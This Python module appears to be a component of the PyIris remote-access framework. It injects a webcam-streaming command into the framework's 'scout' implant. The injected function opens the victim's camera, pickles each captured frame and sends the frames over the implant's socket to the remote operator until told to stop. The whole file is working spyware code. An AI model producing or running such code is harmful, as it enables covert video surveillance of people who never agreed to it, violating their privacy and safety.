import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pickle')
        config.import_statements.append('import cv2')
        config.functions.append('''
def webcam_stream(sock, data):
    index_list = data.split(" ")
    if len(index_list) > 1:
        camera = cv2.VideoCapture(int(index_list[1]))
    else: 
        camera = cv2.VideoCapture(0)
    if not camera.isOpened():
        send_all(sock, "[-]Unable to open user camera, possibly the wrong camera index was provided, try providing a camera index of another non-zero integer eg -1, 2")
        return
    else:
        send_all(sock, "[+]Successfully opened camera!")
    while True:
        ret, frame = camera.read()
        if ret:
            framebytes = pickle.dumps(frame)
            send_all(sock, framebytes)
            ack_packet = recv_all(s)
            if ack_packet == '1':
                send_all(sock, "[From scout] Acknowledged kill webcam stream")
                return
        else:
            send_all(sock, "[-]Hit an unexpected error while capturing frames from user webcam")
            return''')
        config.logics.append('''
            elif command == "webcam_stream":
                webcam_stream(s, data)''')
        config.help_menu['webcam_stream <camera index>'] = 'Stream clients webcam to PyIris. Camera index is optional, by default it will be zero. In some instances it may need to be provided due to the 0 index being unavailable'
    elif option == 'info':
        print('\nName             : Webcam streaming component' \
              '\nOS               : Windows' \
              '\nRequired Modules : pickle, cv2' \
              '\nCommands         : webcam_stream <camera index>' \
              '\nDescription      : Stream clients webcam to PyIris\n')
